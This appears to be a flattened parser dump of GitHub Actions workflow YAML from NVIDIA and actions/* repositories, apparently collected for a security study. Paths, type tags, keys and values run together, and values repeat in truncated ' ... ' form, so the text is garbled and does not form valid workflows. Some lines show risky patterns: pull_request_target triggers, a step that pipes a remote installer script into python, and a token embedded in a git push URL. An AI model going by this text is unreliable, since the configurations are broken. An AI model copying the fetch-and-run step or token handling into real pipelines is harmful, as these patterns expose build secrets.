/home/huawei/github-actions-security/.github/workflows/NVIDIA_cutlass__labeler.yml/home/huawei/github-actions-security/.github/workflows/home/huawei/github-actions-security/.github/home/huawei/github-actions-security/home/huawei/home/nametag:yaml.org,2002:strPull Request Labeler"Pull R ... abeler"ontag:yaml.org,2002:boolpull_request_targettag:yaml.org,2002:seq- pull_ ... _targetjobstriageruns-onubuntu-lateststepsusesactions/labeler@mainwithrepo-token${{ secrets.GITHUB_TOKEN }}"${{ se ... KEN }}"tag:yaml.org,2002:maprepo-to ... KEN }}"uses: a ... er@main- uses: ... er@mainruns-on ... -latesttriage:name: " ... abeler"/home/huawei/github-actions-security/.github/workflows/NVIDIA_cutlass__new-issues-to-triage-projects.ymlAuto Assign New Issues to Triage ProjectAuto As ... Projectissuestypesopened[opened]types: [opened]issues:envGITHUB_TOKEN${{ sec ... OKEN }}GITHUB_ ... OKEN }}assign_one_projectAssign to New Issues to Triage ProjectAssign  ... ProjectProcess bug issuesdocker://takanabe/github-actions-automate-projects:v0.0.1docker: ... :v0.0.1ifcontains(github.event.issue.labels.*.name, 'bug') && contains(github.event.issue.labels.*.name, '? - Needs Triage')contain ... riage')GITHUB_PROJECT_URLhttps://github.com/NVIDIA/cutlasshttps:/ ... cutlassGITHUB_PROJECT_COLUMN_NAMEGITHUB_ ... MN_NAMENeeds prioritizing'Needs prioritizing'name: P ...  issuesProcess feature issuesProcess ...  issuescontains(github.event.issue.labels.*.name, 'feature request') && contains(github.event.issue.labels.*.name, '? - Needs Triage')Process other issuescontains(github.event.issue.labels.*.name, '? - Needs Triage') && (!contains(github.event.issue.labels.*.name, 'bug') && !contains(github.event.issue.labels.*.name, 'feature request'))contain ... uest'))- name: ...  issuesassign_one_project:name: A ... Project/home/huawei/github-actions-security/.github/workflows/NVIDIA_cutlass__stale.ymlMark inactive issues and pull requestsMark in ... equestsschedulecron0 * * * *"0 * * * *"cron: "0 * * * *"- cron: "0 * * * *"schedule:mark-inactive-30dMark 30 day inactive issues and pull requestsMark 30 ... equestsactions/stale@v3stale-issue-messageThis issue has been labeled `inactive-30d` due to no recent activity in the past 30 days. Please close this issue if no further response or action is needed. Otherwise, please respond with a comment indicating any updates or changes to the original issue and/or confirm this issue still needs to be addressed. This issue will be labeled `inactive-90d` if there is no activity in the next 60 days.
>stale-issue-labelinactive-30d"inactive-30d"exempt-issue-labels0 - Blocked,0 - Backlog,good first issue"0 - Bl ...  issue"days-before-issue-staledays-be ... e-stale30tag:yaml.org,2002:intdays-before-issue-closedays-be ... e-close-1stale-pr-messageThis PR has been labeled `inactive-30d` due to no recent activity in the past 30 days. Please close this PR if it is no longer required. Otherwise, please respond with a comment indicating any updates. This PR will be labeled `inactive-90d` if there is no activity in the next 60 days.
stale-pr-labelexempt-pr-labelsdays-before-pr-staledays-before-pr-closeoperations-per-run50repo-to ... OKEN }}name: M ... equests- name: ... equestsmark-inactive-90dMark 90 day inactive issues and pull requestsMark 90 ... equestsThis issue has been labeled `inactive-90d` due to no recent activity in the past 90 days. Please close this issue if no further response or action is needed. Otherwise, please respond with a comment indicating any updates or changes to the original issue and/or confirm this issue still needs to be addressed.
inactive-90d"inactive-90d"90This PR has been labeled `inactive-90d` due to no recent activity in the past 90 days. Please close this PR if it is no longer required. Otherwise, please respond with a comment indicating any updates.
mark-inactive-30d:/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__basic-checks.yamlbasic checks"basic checks"workflow_calloutputsversiondescriptionThe short SHA to use as a version string"The sh ... string"value${{ jobs.variables.outputs.version }}${{ job ... sion }}descrip ... string"golang_versionThe golang version for this project"The go ... roject"${{ jobs.variables.outputs.golang_version }}descrip ... roject"version:outputs:pull_requestsynchronize- openedbranchesmainrelease-*- maintypes:workflow_call:variables./.github/workflows/variables.yaml./.gith ... es.yamluses: . ... es.yamlgolangneeds- variables./.github/workflows/golang.yaml./.gith ... ng.yaml${{ needs.variables.outputs.golang_version }}${{ nee ... sion }}golang_ ... sion }}needs:helm./.github/workflows/helm.yaml./.gith ... lm.yamlcode-scanning./.github/workflows/code_scanning.yamlvariables:name: "basic checks"/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__ci.yamlCI Pipelinepushpull-request/[0-9]+"pull-r ... [0-9]+"- "pull ... [0-9]+"branches:push:basic./.github/workflows/basic-checks.yaml./.gith ... ks.yamluses: . ... ks.yamlimage./.github/workflows/image.yaml./.gith ... ge.yaml- basicsecretsinherit${{ needs.basic.outputs.version }}build_multi_arch_imagesbuild_m ... _images${{ github.ref_name == 'main' || startsWith(github.ref_name, 'release-') }}${{ git ... e-') }}version ... sion }}uses: . ... ge.yamle2e-test- image./.github/workflows/e2e.yaml./.gith ... 2e.yaml${{ needs.basic.outputs.golang_version }}basic:name: CI Pipeline/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__code_scanning.yamlCodeQL"CodeQL"inputsrequiredtruetypestringrequired: truegolang_version:inputs:analyzeAnalyze Go code with CodeQLAnalyze ...  CodeQLtimeout-minutes360permissionssecurity-eventswritepackagesreadsecurit ... : writeCheckout repositoryactions/checkout@v4name: C ... ositoryInstall Goactions/setup-go@v5go-version${{ inputs.golang_version }}${{ inp ... sion }}go-vers ... sion }}name: Install GoInitialize CodeQLgithub/codeql-action/init@v3github/ ... init@v3languagesgobuild-modemanuallanguages: goname: I ...  CodeQLshellbashrunmake build
|shell: bashPerform CodeQL AnalysisPerform ... nalysisgithub/codeql-action/analyze@v3github/ ... lyze@v3category/language:go"/language:go"categor ... age:go"name: P ... nalysis- name: ... ositoryname: A ...  CodeQLanalyze:name: "CodeQL"/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__e2e.yamlEnd-to-end TestsAWS_ACCESS_KEY_IDAWS_SECRET_ACCESS_KEYAWS_SEC ... ESS_KEYAWS_SSH_KEYSLACK_BOT_TOKENSLACK_CHANNEL_IDAWS_ACCESS_KEY_ID:e2e-testslinux-amd64-cpu4Check out codename: Check out codeSet up HolodeckNVIDIA/holodeck@v0.2.6NVIDIA/ ... @v0.2.6aws_access_key_id${{ secrets.AWS_ACCESS_KEY_ID }}${{ sec ... Y_ID }}aws_secret_access_keyaws_sec ... ess_key${{ secrets.AWS_SECRET_ACCESS_KEY }}${{ sec ... _KEY }}aws_ssh_key${{ secrets.AWS_SSH_KEY }}holodeck_configtests/e2e/infra/aws.yaml"tests/ ... s.yaml"aws_acc ... Y_ID }}name: S ... olodeckRun e2e testsKUBECONFIG${{ github.workspace }}/kubeconfig${{ git ... econfigE2E_IMAGE_REPOghcr.io/nvidia/k8s-device-pluginghcr.io ... -pluginE2E_IMAGE_TAG${{ inputs.version }}-ubi9${{ inp ... }}-ubi9LOG_ARTIFACTS${{ github.workspace }}/e2e_logs${{ git ... 2e_logsKUBECON ... econfigmake test-e2e
name: Run e2e testsArchive test logs${{ failure() }}actions/upload-artifact@v4actions ... fact@v4e2e-test-logspath./e2e_logs/retention-days15name: e2e-test-logsname: A ... st logsSend Slack alert notificationSend Sl ... icationidslackfalseslackapi/slack-github-action@v2.1.0slackap ... @v2.1.0${{ secrets.SLACK_BOT_TOKEN }}SUMMARY_URLhttps://github.com/${{github.repository}}/actions/runs/${{github.run_id}}https:/ ... un_id}}SLACK_B ... OKEN }}channel-id${{ secrets.SLACK_CHANNEL_ID }}${{ sec ... L_ID }}slack-message:x: On repository ${{ github.repository }} the Workflow *${{ github.workflow }}* has failed.

Details: ${{ env.SUMMARY_URL }}
channel ... L_ID }}name: S ... ication- name: ... ut coderuns-on ... 64-cpu4e2e-tests:name: E ... d Tests/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__golang.yamlGolangcheckCheckout codeuses: a ... kout@v4Lintgolangci/golangci-lint-action@v8golangc ... tion@v8latestargs-v --timeout 5mskip-cacheversion: latestname: LintCheck golang modulesmake check-modules
make -C deployments/devel check-modules
name: C ... modules- uses: ... kout@v4testUnit testname: Checkout codemake testrun: make testname: Unit testbuildBuildmake buildrun: make buildname: Buildcheck:name: Golang/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__helm.yamlHelmTestmake test-helmrun: make test-helmname: Testtest:name: Helm/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__image.yamlImageSet up QEMUdocker/setup-qemu-action@v3docker/ ... tion@v3tonistiigi/binfmt:mastertonisti ... :masterimage:  ... :mastername: Set up QEMUSet up Docker Buildxdocker/setup-buildx-action@v3name: S ...  BuildxLogin to GitHub Container RegistryLogin t ... egistrydocker/login-action@v3registryghcr.iousername${{ github.actor }}passwordregistry: ghcr.ioname: L ... egistryBuild imageIMAGE_NAMEVERSION${{ inputs.version }}PUSH_ON_BUILDBUILD_MULTI_ARCH_IMAGESBUILD_M ... _IMAGES${{ inputs.build_multi_arch_images }}${{ inp ... ages }}IMAGE_N ... -pluginecho "${VERSION}"
make -f deployments/container/Makefile build
name: Build imagebuild:name: Image/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__publish-helm.yamlPublish Helm Chartreleasepublished- publishedrelease:update-helm-chartsUpdate gh-pages branch helm charts and indexUpdate  ... d indexHELM_REPO_PATHreleases/helm-${{ github.event.release.tag_name }}/release ... ame }}/HELM_RE ... ame }}/Install Helmazure/setup-helm@v4.3.0azure/s ... @v4.3.03.14.4version: 3.14.4name: Install HelmCheck out repofetch-depth0fetch-depth: 0name: Check out repoUpdate helm indexGH_TOKENGH_TOKE ... OKEN }}git config user.name "Github Actions"
git config user.email "no-reply@github.com"
./hack/update-helm-index.sh --helm-repo-path $HELM_REPO_PATH --version ${{ github.event.release.tag_name }}
name: U ... m indexPush updated Helm charts and index to gh-pages branchPush up ...  branchgit -C $HELM_REPO_PATH push https://${GITHUB_ACTOR}:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }} gh-pages
name: P ...  branch- name: Install Helmname: U ... d indexupdate-helm-charts:name: P ... m Chart/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__release.yamlReleasetagsv*- v*tags:Generate Helm Charts./hack/package-helm-charts.sh ${{ github.ref_name }}
name: G ...  ChartsCreate Draft Release./hack/create-release.sh ${{ github.ref_name }}
name: C ... Releasename: Release/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__stale.yamlStale issues and pull requestsStale i ... equests21 4 * * *"21 4 * * *"cron: "21 4 * * *"- cron: "21 4 * * *"stalepull-requestsissues: writeactions/stale@v9This issue is stale because it has been open 90 days with no activity. This issue will be closed in 30 days unless new comments are made or the stale label is removed.'This i ... moved.'This PR is stale because it has been open 90 days with no activity. This PR will be closed in 30 days unless new comments are made or the stale label is removed.'This P ... moved.'lifecycle/stale'lifecycle/stale'days-before-staleclose-issue-messageThis issue was automatically closed due to inactivity.'This i ... ivity.'close-pr-messageThis pull request was automatically closed due to inactivity.'This p ... ivity.'remove-stale-when-updatedremove- ... updated300stale-i ... moved.'uses: a ... tale@v9- uses: ... tale@v9permissions:stale:name: S ... equests/home/huawei/github-actions-security/.github/workflows/NVIDIA_k8s-device-plugin__variables.yaml${{ steps.version.outputs.version }}${{ ste ... sion }}${{ steps.golang_version.outputs.golang_version }}Generate Commit Short SHAGenerat ... ort SHAecho "version=$(echo $GITHUB_SHA | cut -c1-8)" >> "$GITHUB_OUTPUT"echo "v ... OUTPUT"name: G ... ort SHAGet Golang VersionGOLANG_VERSION=$(./hack/golang-version.sh)
echo "Detected $GOLANG_VERSION"
echo "golang_version=${GOLANG_VERSION}" >> $GITHUB_OUTPUT
name: G ... Versionon:/home/huawei/github-actions-security/.github/workflows/PRTargetWorkflow.ymlPR Target Workflowreopenedpull_request_target:pr-target-checkWait for 2 minutessleep 120name: W ... minutespr-target-check:name: P ... orkflow/home/huawei/github-actions-security/.github/workflows/RedHatOfficial_Overpass__build.yamlBuild font and specimenBuild f ... pecimen[push]actions/checkout@v2uses: a ... kout@v2Set up Python 3.8actions/setup-python@v2actions ... thon@v2python-version3.8tag:yaml.org,2002:floatpython-version: 3.8name: S ... hon 3.8Install Linux dependenciesInstall ... denciessudo snap install yq
name: I ... denciesBuild fontname: Build fontCheck with fontbakeryCheck w ... tbakerycontinue-on-errorname: C ... tbakeryGenerate proofsmake proofname: G ...  proofsGathermkdir for-gh-pages
mv fontbakery-report.html for-gh-pages
mv proof/* for-gh-pages
name: GatherArchive artifactsactions/upload-artifact@v2actions ... fact@v2Artifactsfor-gh-pages
name: Artifactsname: A ... tifactsRemove temp folderrm -rf for-gh-pages
name: R ...  folder- uses: ... kout@v2name: B ... pecimen/home/huawei/github-actions-security/.github/workflows/actions_cache__check-dist.ymlCheck dist/paths-ignore**.md'**.md'- '**.md'paths-ignore:workflow_dispatchtag:yaml.org,2002:nullcall-check-distactions/reusable-workflows/.github/workflows/check-dist.yml@mainactions ... ml@mainnode-version20.x"20.x"node-version: "20.x"name: Check dist/call-check-dist:/home/huawei/github-actions-security/.github/workflows/actions_cache__close-inactive-issues.ymlClose inactive issuesClose i ...  issues30 8 * * *"30 8 * * *"cron: "30 8 * * *"- cron: "30 8 * * *"close-issues2005"stale"This issue is stale because it has been open for 200 days with no activity. Leave a comment to avoid closing this issue in 5 days."This i ...  days."This issue was closed because it has been inactive for 5 days since being marked as stale."This i ... stale."days-be ... le: 200close-issues:name: C ...  issues/home/huawei/github-actions-security/.github/workflows/actions_cache__codeql.ymlCode scanning - action"Code s ... action"0 19 * * 0'0 19 * * 0'cron: '0 19 * * 0'- cron: '0 19 * * 0'CodeQL-BuildAutobuildgithub/codeql-action/autobuild@v3github/ ... uild@v3name: AutobuildCodeQL-Build:name: " ... action"/home/huawei/github-actions-security/.github/workflows/actions_cache__issue-opened-workflow.ymlAssign issuerun-actionGet current oncalloncallecho "CURRENT=$(curl --request GET 'https://api.pagerduty.com/oncalls?include[]=users&schedule_ids[]=P5VG2BX&earliest=true' --header 'Authorization: Token token=${{ secrets.PAGERDUTY_TOKEN }}' --header 'Accept: application/vnd.pagerduty+json;version=2' --header 'Content-Type: application/json' | jq -r '.oncalls[].user.name')" >> $GITHUB_OUTPUT
name: G ...  oncalladd_assigneescurl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN}}" https://api.github.com/repos/${{github.repository}}/issues/${{ github.event.issue.number}}/assignees -d '{"assignees":["${{steps.oncall.outputs.CURRENT}}"]}'
name: add_assignees- name: ...  oncallrun-action:name: Assign issue/home/huawei/github-actions-security/.github/workflows/actions_cache__licensed.ymlLicensedcall-licensedactions/reusable-workflows/.github/workflows/licensed.yml@mainname: Licensedcall-licensed:/home/huawei/github-actions-security/.github/workflows/actions_cache__pr-opened-workflow.ymlAdd Reviewer PRRequest Reviewcurl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN}}" https://api.github.com/repos/${{github.repository}}/pulls/${{ github.event.pull_request.number}}/requested_reviewers -d '{"reviewers":["${{steps.oncall.outputs.CURRENT}}"]}'
name: Request ReviewAdd Assigneecurl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN}}" https://api.github.com/repos/${{github.repository}}/issues/${{ github.event.pull_request.number}}/assignees -d '{"assignees":["${{steps.oncall.outputs.CURRENT}}"]}'    
name: Add Assigneename: A ... ewer PR/home/huawei/github-actions-security/.github/workflows/actions_cache__publish-immutable-actions.ymlPublish Immutable Action Version'Publis ... ersion'released[released]types: [released]publishcontentsid-tokencontents: readChecking outname: Checking outPublishactions/publish-immutable-action@0.0.3actions ... n@0.0.3name: Publish- name: Checking outpublish:name: ' ... ersion'/home/huawei/github-actions-security/.github/workflows/actions_cache__release-new-action-version.ymlRelease new action versionRelease ... versionTAG_NAMETag name that the major tag will point to'Tag na ... int to'descrip ... int to'TAG_NAME:${{ github.event.inputs.TAG_NAME || github.event.release.tag_name }}${{ git ... name }}TAG_NAM ... name }}contents: writeupdate_tagUpdate the major tag to include the ${{ github.event.inputs.TAG_NAME || github.event.release.tag_name }} changesUpdate  ... changesenvironmentreleaseNewActionVersionrelease ... Versionname: r ... VersionUpdate the ${{ env.TAG_NAME }} tagUpdate  ...  }} tagupdate-major-tagactions/publish-action@v0.3.0actions ... @v0.3.0source-tag${{ env.TAG_NAME }}slack-webhook${{ secrets.SLACK_WEBHOOK }}${{ sec ... HOOK }}source- ... NAME }}name: U ...  }} tag- name: ...  }} tagname: U ... changesupdate_tag:name: R ... version/home/huawei/github-actions-security/.github/workflows/actions_cache__workflow.ymlTestsreleases/**pull_request:strategymatrixoswindows-latestmacOS-latest[ubuntu ... latest]os: [ub ... latest]fail-fastmatrix:${{ matrix.os }}Checkoutname: CheckoutSetup Node.js 20.xactions/setup-node@v4actions ... node@v4cachenpmnode-version: 20.xname: S ... js 20.xnpm cirun: npm ciPrettier Format CheckPrettie ... t Checknpm run format-checkname: P ... t CheckESLint Checknpm run lintname: ESLint CheckBuild & Testnpm run testname: Build & Test- name: Checkoutstrategy:test-saveGenerate files in working directoryGenerat ... rectory__tests__/create-cache-files.sh ${{ runner.os }} test-cache__tests ... t-cachename: G ... rectoryGenerate files outside working directory__tests__/create-cache-files.sh ${{ runner.os }} ~/test-cacheSave cache./keytest-${{ runner.os }}-${{ github.run_id }}test-${ ... n_id }}test-cache
~/test-cache
key: te ... n_id }}name: Save cachetest-restoreRestore cachename: Restore cacheVerify cache files in working directoryVerify  ... rectory__tests__/verify-cache-files.sh ${{ runner.os }} test-cachename: V ... rectoryVerify cache files outside working directory__tests__/verify-cache-files.sh ${{ runner.os }} ~/test-cacheneeds: test-savetest-proxy-savecontainerubuntu:latestoptions--dns 127.0.0.1image: ubuntu:latestservicessquid-proxyubuntu/squid:latestports3128:3128- 3128:3128image:  ... :latestsquid-proxy:https_proxyhttp://squid-proxy:3128http:// ... xy:3128https_p ... xy:3128Generate files__tests__/create-cache-files.sh proxy test-cachename: Generate filestest-proxy-${{ github.run_id }}test-pr ... n_id }}test-cachetest-proxy-restoreVerify cache__tests__/verify-cache-files.sh proxy test-cachename: Verify cacheneeds:  ... xy-savename: Tests/home/huawei/github-actions-security/.github/workflows/actions_setup-node__basic-validation.ymlBasic validationreleases/*call-basic-validationcall-ba ... idationactions/reusable-workflows/.github/workflows/basic-validation.yml@main'20.x'node-version: '20.x'name: B ... idationcall-ba ... dation:/home/huawei/github-actions-security/.github/workflows/actions_setup-node__check-dist.ymlCheck distname: Check dist/home/huawei/github-actions-security/.github/workflows/actions_setup-node__codeql-analysis.ymlCodeQL analysis[main]branches: [main]0 3 * * 0'0 3 * * 0'cron: '0 3 * * 0'- cron: '0 3 * * 0'call-codeQL-analysisactions/reusable-workflows/.github/workflows/codeql-analysis.yml@mainname: C ... nalysiscall-co ... alysis:/home/huawei/github-actions-security/.github/workflows/actions_setup-node__e2e-cache.ymle2e-cachenode-npm-depencies-cachingnode-np ... cachingTest npm (Node ${{ matrix.node-version}}, ${{ matrix.os }})Test np ... .os }})macos-latestmacos-13[ubuntu ... cos-13]182022[18, 20, 22]os: [ub ... cos-13]fail-fast: falseClean global cachenpm cache clean --forcenpm cac ... --forcename: C ... l cacheSetup Node${{ matrix.node-version }}${{ mat ... sion }}'npm'node-ve ... sion }}name: Setup NodeInstall dependenciesnpm installVerify node and npm__tests__/verify-node.sh "${{ matrix.node-version }}"__tests ... ion }}"name: V ... and npmname: T ... .os }})node-pnpm-depencies-cachingnode-pn ... cachingTest pnpm (Node ${{ matrix.node-version}}, ${{ matrix.os }})Test pn ... .os }})Install pnpmpnpm/action-setup@v46.10.0version: 6.10.0name: Install pnpmGenerate pnpm filepnpm installname: G ... pm fileRemove dependenciespwshRemove-Item node_modules -Force -RecurseRemove- ... Recursename: R ... denciesrm -rf ~/.pnpm-storepnpm'pnpm'Verify node and pnpmname: V ... nd pnpmnode-yarn1-depencies-cachingnode-ya ... cachingTest yarn 1 (Node ${{ matrix.node-version}}, ${{ matrix.os }})Test ya ... .os }})[18, 20]Yarn versionyarn --versionname: Yarn versionGenerate yarn fileyarn installname: G ... rn fileyarn cache cleanyarn'yarn'yarn install --ignore-enginesyarn in ... enginesVerify node and yarnname: V ... nd yarnnode-yarn3-depencies-cachingTest yarn 3 (Node ${{ matrix.node-version}}, ${{ matrix.os }})YARN_ENABLE_IMMUTABLE_INSTALLSYARN_EN ... NSTALLSYARN_EN ... : falseUpdate yarnyarn set version 3.6.4yarn se ... n 3.6.4name: Update yarnGenerate simple .yarnrc.ymlGenerat ... nrc.ymlecho "nodeLinker: node-modules" >> .yarnrc.yml
name: G ... nrc.ymlyarn cache clean --allyarn ca ... n --allyarn-subprojectsTest yarn subprojectsTest ya ... rojectsnode-ve ... 20, 22]prepare sub-projects__tests__/prepare-yarn-subprojects.sh yarn1__tests ... h yarn1name: p ... rojectscache-dependency-pathcache-d ... cy-path**/*.lock
yarn.lock
name: T ... rojectsyarn-subprojects-berry-localyarn-su ... y-localTest yarn subprojects all locally managedTest ya ... managed__tests__/prepare-yarn-subprojects.sh keepcache keepcache__tests ... epcachesub2/*.lock
sub3/*.lock
name: T ... managedyarn-subprojects-berry-globalyarn-su ... -globalTest yarn subprojects some locally managed__tests__/prepare-yarn-subprojects.sh global__tests ...  globalyarn-subprojects-berry-gityarn-su ... rry-gitTest yarn subprojects managed by gitTest ya ...  by git/bin/bash __tests__/prepare-yarn-subprojects.sh keepcache/bin/ba ... epcachename: T ...  by gitnode-np ... aching:name: e2e-cache/home/huawei/github-actions-security/.github/workflows/actions_setup-node__licensed.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-node__proxy.ymlproxytest-proxyClear tool cacherm -rf $RUNNER_TOOL_CACHE/*rm -rf  ... CACHE/*Setup node 1414.xnode-version: 14.xname: Setup node 14__tests__/verify-node.sh 14__tests ... e.sh 14test-bypass-proxyhttp://no-such-proxy:3128no_proxyapi.github.com,github.com,nodejs.org,registry.npmjs.org,*.s3.amazonaws.com,s3.amazonaws.comapi.git ... aws.comSetup node 1111node-version: 11name: Setup node 11__tests__/verify-node.sh 11__tests ... e.sh 11test-proxy:name: proxy/home/huawei/github-actions-security/.github/workflows/actions_setup-node__publish-immutable-actions.yml[published]types: [published]actions/publish-immutable-action@v0.0.4actions ... @v0.0.4/home/huawei/github-actions-security/.github/workflows/actions_setup-node__release-new-action-version.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-node__update-config-files.ymlUpdate configuration filesUpdate  ... n filescall-update-configuration-filescall-up ... n-filesactions/reusable-workflows/.github/workflows/update-config-files.yml@mainname: U ... n filescall-up ... -files:/home/huawei/github-actions-security/.github/workflows/actions_setup-node__versions.ymlversionslocal-cacheruns-on ... x.os }}lts-syntaxlts/dubniumlts/erbiumlts/fermiumlts/*lts/-1[lts/du ... lts/-1]check-latestrunner.os != 'Windows' && runner.os != 'macOS'runner. ... 'macOS'. "$NVM_DIR/nvm.sh"
[[ $(nvm version-remote "${{ matrix.node-version }}") =~ ^v([^.]+) ]]
__tests__/verify-node.sh "${BASH_REMATCH[1]}"
if: run ... 'macOS'v8-canary-syntax20-v8-canary'20-v8-canary'20.0.0-v8-canary'20.0.0-v8-canary'20.0.0-v8-canary20221101e50e45c9f8'20.0.0 ... 45c9f8'[canaryVersion="${{ matrix.node-version }}"
majorVersion=$(echo $canaryVersion | cut -d- -f1)
__tests__/verify-node.sh "$majorVersion"
nightly-syntax20-nightly21-nightly18.0.0-nightly[20-nig ... ightly]nightlyVersion="${{ matrix.node-version }}"
majorVersion=$(echo $nightlyVersion | cut -d- -f1)
__tests__/verify-node.sh "$majorVersion"
rc-syntax20.0.0-rc.118.0.0-rc.219.0.0-rc.0[20.0.0 ... 0-rc.0]rcVersion="${{ matrix.node-version }}"
majorVersion=$(echo $rcVersion | cut -d- -f1)
__tests__/verify-node.sh "$majorVersion"
manifest18.20.020.10.022.0.0[18.20. ... 22.0.0]Setup Node and check latestSetup N ...  latestname: S ...  latestversion-filenode-version-file.nvmrc.tool-versions.tool-versions-nodepackage.json[.nvmrc ... e.json]Setup node from node version fileSetup n ... on file__tests__/data/${{ matrix.node-version-file }}'__test ... ile }}'node-ve ... ile }}'name: S ... on fileVerify node__tests__/verify-node.sh 20__tests ... e.sh 20name: Verify nodeversion-file-volta__tests__/data/package-volta.json'__test ... a.json'node-ve ... a.json'version-file-volta-extendsversion ... extends__tests__/data/package-volta-extends.json'__test ... s.json'node-ve ... s.json'node-dist1719[17, 19]Setup Node from distname: S ... om distold-versionsSetup node 0.12.18 from distSetup n ... om dist0.12.18node-ve ... 0.12.18__tests__/verify-node.sh 0.12.18 SKIP_NPM__tests ... KIP_NPMarchSetup node 20 x86 from dist'20'architecturex86'x86'node-version: '20'__tests__/verify-arch.sh "ia32"__tests ...  "ia32"node-latest-aliasescurrentnode[curren ... , node]Get node versionlatestNodeVersion=$(curl https://nodejs.org/dist/index.json | jq -r '. [0].version')
echo "LATEST_NODE_VERSION=$latestNodeVersion" >> $GITHUB_OUTPUT
name: G ... versionRetrieve version after installRetriev ... installupdatedVersion=$(echo $(node --version))
echo "NODE_VERSION_UPDATED=$updatedVersion" >> $GITHUB_OUTPUT
updatedVersionname: R ... installCompare versions${{ steps.version.outputs.LATEST_NODE_VERSION != steps.updatedVersion.outputs.NODE_VERSION_UPDATED}}${{ ste ... DATED}}echo "Latest node version failed to download."
exit 1
name: C ... ersions- name: ... versionlocal-cache:name: versions/home/huawei/github-actions-security/.github/workflows/actions_setup-python__basic-validation.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-python__check-dist.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-python__codeql-analysis.yml'main'['main']branches: ['main']/home/huawei/github-actions-security/.github/workflows/actions_setup-python__e2e-cache-freethreaded.ymle2e-cache freethreadpython-pip-dependencies-cachingpython- ... cachingTest pip (Python ${{ matrix.python-version}}, ${{ matrix.os }})Test pi ... .os }})ubuntu-22.04ubuntu-24.04-armubuntu-22.04-arm3.13.0t3.13.1t3.13.2t[3.13.0 ... .13.2t]os:Setup Python${{ matrix.python-version }}pip'pip'python- ... sion }}name: Setup Pythonpip install numpy pandas requestspip ins ... equestspython-pipenv-dependencies-cachingTest pipenv (Python ${{ matrix.python-version}}, ${{ matrix.os }})cache-pipenvpipenv'pipenv'Install pipenvcurl https://raw.githubusercontent.com/pypa/pipenv/master/get-pipenv.py | pythoncurl ht ...  pythonname: Install pipenvpipenv install requestspipenv  ... equestspython-poetry-dependencies-cachingTest poetry (Python ${{ matrix.python-version}}, ${{ matrix.os }})Test po ... .os }})3.13.03.13.13.13.2[3.13.0 ... 3.13.2]Install poetrypipx install poetryname: Install poetryInit pyproject.tomlmv ./__tests__/data/pyproject.toml .mv ./__ ... .toml .name: I ... ct.tomlfreethreadedpoetry'poetry'poetry install --no-rootpoetry  ... no-rootpython-pip-dependencies-caching-pathpython- ... ng-pathTest pip (Python ${{ matrix.python-version}}, ${{ matrix.os }}, caching path)Test pi ... g path)__tests__/data/requirements.txt__tests ... nts.txtname: T ... g path)python-pipenv-dependencies-caching-pathTest pipenv (Python ${{ matrix.python-version}}, ${{ matrix.os }}, caching path)**/pipenv-requirements.txt'**/pip ... ts.txt'python- ... aching:name: e ... ethread/home/huawei/github-actions-security/.github/workflows/actions_setup-python__e2e-cache.yml3.9'3.9'pypy-3.9-v7.x'pypy-3.9-v7.x'3.10'3.10'pypy-3.10-v7.x'pypy-3.10-v7.x'3.11'3.11'pypy-3.11-v7.x'pypy-3.11-v7.x'3.12'3.12'3.13'3.13'excludeos: windows-latest- os: windows-latest['3.10' ... '3.13']os: ubuntu-22.04os: ubuntu-22.04-armPrepare environmentmv ./__tests__/data/Pipfile.lock .
mv ./__tests__/data/Pipfile .
mv ./__tests__/test-pipenv.py .
name: P ... ronmentsteps.cache-pipenv.outputs.cache-hit != 'true'steps.c ...  'true'if ("${{ matrix.python-version }}" -Match "pypy") {
  pipenv install --python pypy # --keep-outdated
} else {
  pipenv install --python ${{ matrix.python-version }} # --keep-outdated
}
Run Python Scriptpipenv run python test-pipenv.pypipenv  ... penv.pyname: R ...  Script/home/huawei/github-actions-security/.github/workflows/actions_setup-python__e2e-tests.ymle2e teststest-setup-pythonTest setup-python${{ matrix.operating-system }}${{ mat ... stem }}operating-systemoperating-system:Run with setup-python 3.9.13Run wit ...  3.9.133.9.13python- ...  3.9.13name: R ...  3.9.13Verify 3.9.13python __tests__/verify-python.py 3.9.13python  ...  3.9.13name: Verify 3.9.133.10.11python- ... 3.10.11Verify 3.10.11python __tests__/verify-python.py 3.10.11python  ... 3.10.11name: Verify 3.10.11Run with setup-python 3.11.9Run wit ...  3.11.93.11.9python- ...  3.11.9name: R ...  3.11.9Verify 3.11.9python __tests__/verify-python.py 3.11.9python  ...  3.11.9name: Verify 3.11.9Run with setup-python 3.12.7Run wit ...  3.12.73.12.7python- ...  3.12.7name: R ...  3.12.7Verify 3.12.7python __tests__/verify-python.py 3.12.7python  ...  3.12.7name: Verify 3.12.7Run with setup-python 3.13.0Run wit ...  3.13.0python- ...  3.13.0name: R ...  3.13.0Verify 3.13.0python __tests__/verify-python.py 3.13.0python  ...  3.13.0name: Verify 3.13.0Run with setup-python 3.13Run wit ... on 3.13cp313python- ...  '3.13'name: R ... on 3.13Verify 3.13python __tests__/verify-python.py 3.13python  ... py 3.13name: Verify 3.13Run python-path sample 3.13Run pyt ... le 3.13pipx run --python '${{ steps.cp313.outputs.python-path }}' nox --versionpipx ru ... versionname: R ... le 3.13Run with setup-python ==3.13Run wit ...  ==3.13==3.13'==3.13'python- ... ==3.13'name: R ...  ==3.13Verify ==3.13name: Verify ==3.13Run with setup-python <3.13Run wit ... n <3.13<3.13'<3.13'python- ... 